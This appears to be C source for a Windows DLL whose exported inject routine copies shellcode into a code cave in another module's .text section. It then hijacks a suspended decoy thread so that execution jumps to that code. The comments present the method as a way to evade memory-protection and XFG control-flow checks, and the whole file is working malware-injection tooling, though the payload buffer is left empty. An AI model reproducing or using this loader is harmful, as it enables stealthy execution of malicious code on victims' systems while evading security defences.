#include <Windows.h>
#include <Psapi.h>

/*
 * Use my SRDI module to inject
 * The injector(another program) shall free this piece of allocated memory after 1 second
 * to wipe out initial RWX region(SRDI will auto allocate proper memory for itself)
*/

#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
#define GET_NTHEADER(dos_header) (PIMAGE_NT_HEADERS)((DWORD_PTR)dos_header + dos_header->e_lfanew)
#define DLLEXPORT __declspec(dllexport)

typedef struct _UNICODE_STRING
{
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES
{
    ULONG           Length;
    HANDLE          RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG           Attributes;
    PVOID           SecurityDescriptor;
    PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

typedef struct _PS_ATTRIBUTE
{
    ULONG Attribute;
    SIZE_T Size;
    union
    {
        ULONG Value;
        PVOID ValuePtr;
    } u1;
    PSIZE_T ReturnLength;
} PS_ATTRIBUTE, *PPS_ATTRIBUTE;

typedef struct _PS_ATTRIBUTE_LIST
{
    SIZE_T       TotalLength;
    PS_ATTRIBUTE Attributes[1];
} PS_ATTRIBUTE_LIST, *PPS_ATTRIBUTE_LIST;

typedef NTSTATUS(NTAPI *NWVM)(HANDLE, PVOID, PVOID, ULONG, PULONG);
typedef NTSTATUS(NTAPI *NCT)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PPS_ATTRIBUTE_LIST);
typedef NTSTATUS(NTAPI *NPVM)(
    IN  HANDLE ProcessHandle,
    IN OUT PVOID *BaseAddress,
    IN OUT PULONG RegionSize,
    IN  ULONG NewProtect,
    OUT PULONG OldProtect
    );
typedef NTSTATUS (NTAPI *NGCT)(HANDLE, PCONTEXT);
typedef NTSTATUS (NTAPI *NSCT)(HANDLE, PCONTEXT);
typedef NTSTATUS(NTAPI *NST)(HANDLE, PULONG);
typedef NTSTATUS(NTAPI *NRT)(HANDLE, PULONG);


void DLLEXPORT inject(void);
PVOID find_codecave(SIZE_T sz);

BOOL WINAPI DllMain(
    HINSTANCE hinstDLL,  // handle to DLL module
    DWORD fdwReason,     // reason for calling function
    LPVOID lpvReserved)  // reserved
{
    // Perform actions based on the reason for calling.
    switch (fdwReason) {
    case DLL_PROCESS_ATTACH:
        // Initialize once for each new process.
        // Return FALSE to fail DLL load.
        break;

    case DLL_THREAD_ATTACH:
        // Do thread-specific initialization.
        break;

    case DLL_THREAD_DETACH:
        // Do thread-specific cleanup.
        break;

    case DLL_PROCESS_DETACH:
        // Perform any necessary cleanup.
        break;
    }
    return TRUE;  // Successful DLL_PROCESS_ATTACH.
}

void DLLEXPORT inject(void)
{
    PVOID           codecave, cpy;
    HANDLE          thread;
    DWORD           old;
    HMODULE         ntd = GetModuleHandleA("ntdll.dll");
    NTSTATUS        status;
    SIZE_T          buf_sz, sz_cpy;
    CONTEXT         tcontext;

    // payload
    unsigned char buf[] =
        "";

    codecave = find_codecave(sizeof(buf));
    if (!codecave)
        return;

    cpy = codecave;

    if (!ntd)
        return;

    buf_sz = sizeof(buf) - 1; // auto char arrays are 1 byte larger
    sz_cpy = buf_sz;

    NWVM NtWriteVirtualMemory = (NWVM)GetProcAddress(ntd, "NtWriteVirtualMemory");
    NCT NtCreateThreadEx = (NCT)GetProcAddress(ntd, "NtCreateThreadEx");
    NPVM NtProtectVirtualMemory = (NPVM)GetProcAddress(ntd, "NtProtectVirtualMemory");
    NGCT NtGetContextThread = (NPVM)GetProcAddress(ntd, "NtGetContextThread");
    NSCT NtSetContextThread = (NPVM)GetProcAddress(ntd, "NtSetContextThread");
    NST NtSuspendThread = (NPVM)GetProcAddress(ntd, "NtSuspendThread");
    NRT NtResumeThread = (NPVM)GetProcAddress(ntd, "NtResumeThread");

    if (!NtWriteVirtualMemory || !NtCreateThreadEx || !NtProtectVirtualMemory || !NtGetContextThread
        || !NtSetContextThread || !NtResumeThread || !NtSuspendThread)
        return;

    status = NtProtectVirtualMemory(GetCurrentProcess(), &cpy, &sz_cpy, PAGE_EXECUTE_READWRITE, &old);
    if (!NT_SUCCESS(status))
        return;

    cpy = codecave;
    sz_cpy = buf_sz;

    status = NtWriteVirtualMemory(GetCurrentProcess(), codecave, buf, buf_sz, NULL);
    if (!NT_SUCCESS(status))
        return;

    /*
     * We create a benign function to get a thread context first
     * Sleep is the best to avoid deadlocking
     * Then we change the RIP to our shellcode
     * Why don't we directly create thread with our shellcode address?
     * Because Kernel32!BaseThreadInitXfgThunk will realise that
     * our code cave isn't a XFG compliant target
     * and will raise an error for any XFG enabled targets(most windows system binaries)
     */

    status = NtCreateThreadEx(&thread, GENERIC_ALL, NULL, GetCurrentProcess(), (LPTHREAD_START_ROUTINE)Sleep, 3000, FALSE, NULL, NULL, NULL, NULL); // decoy
    if (!NT_SUCCESS(status))
        return;

    WaitForSingleObject(thread, 1000);

    NtSuspendThread(thread, NULL);
    if (!NT_SUCCESS(status))
        return;

    tcontext.ContextFlags = CONTEXT_FULL;
    status = NtGetContextThread(thread, &tcontext);
    if (!NT_SUCCESS(status))
        return;

    tcontext.Rip = codecave;
    status = NtSetContextThread(thread, &tcontext);
    if (!NT_SUCCESS(status))
        return;

    status = NtResumeThread(thread, NULL);
    if (!NT_SUCCESS(status))
        return;

    NtProtectVirtualMemory(GetCurrentProcess(), &cpy, &sz_cpy, old, &old);

    return;
}

PVOID find_codecave(SIZE_T sz)
{
    PIMAGE_DOS_HEADER       dos_header = NULL;
    PIMAGE_NT_HEADERS       nt_header = NULL;
    PIMAGE_SECTION_HEADER   section_header = NULL;
    PVOID                   text_section = NULL;
    PVOID                   text_section_end = NULL;
    HMODULE                 *modules = NULL;
    DWORD                   modules_count;
    DWORD                   needed;

    EnumProcessModules(GetCurrentProcess(), NULL, 0, &needed);

    modules = VirtualAlloc(NULL, needed, MEM_COMMIT, PAGE_READWRITE);
    if (!modules)
        return NULL;

    if (!EnumProcessModules(GetCurrentProcess(), modules, needed, &needed)) {
        VirtualFree(modules, 0, MEM_RELEASE);
        return NULL;
    }

    modules_count = (DWORD)(needed / sizeof(HMODULE));

    for (DWORD i = 1; i < modules_count; i++) { // 1 to skip current executable, we want code cave in one of the dlls
        dos_header = modules[i];
        nt_header = GET_NTHEADER(dos_header);
        section_header = NULL;
        text_section = NULL;
        text_section_end = NULL;
        for (int i = 0; i < nt_header->FileHeader.NumberOfSections; i++) {
            section_header = (PIMAGE_SECTION_HEADER)((ULONG_PTR)(IMAGE_FIRST_SECTION(nt_header)) + ((ULONG_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));
            if (strcmp((char *)section_header->Name, ".text"))
                continue;

            // found .text section
            text_section = (ULONG_PTR)dos_header + section_header->VirtualAddress;
            text_section_end = (ULONG_PTR)text_section + section_header->SizeOfRawData;

            // search backwards for nulls
            for (int i = 0; i < sz; i++) {
                if ((((PBYTE)text_section_end)[-i - 1]) == 0) {
                    if ((SIZE_T)i + 1 == sz)
                        return (PVOID)((ULONG_PTR)text_section_end - i - 1); // found code cave
                }
                else
                    break;
            }
            break;
        }
    }

    VirtualFree(modules, 0, MEM_RELEASE);
    return NULL;
}